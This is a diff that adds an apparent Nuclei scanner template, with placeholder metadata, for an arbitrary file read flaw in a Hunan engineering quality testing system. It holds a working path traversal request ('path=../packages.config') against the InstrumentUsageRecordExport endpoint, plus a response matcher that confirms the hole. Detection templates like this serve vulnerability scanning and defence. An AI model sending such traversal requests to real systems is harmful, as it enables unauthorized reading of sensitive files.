@@ -1,0 +1,21 @@
+id: pkpmbs-InstrumentUsageRecordExport-fileread
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 湖南建研工程质量检测系统 InstrumentUsageRecordExport 接口处存在任意文件读取漏洞,恶意攻击者可能会利用此漏洞读取敏感文件，对系统造成危害
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft.AspNet.WebPages.zh-Hans'
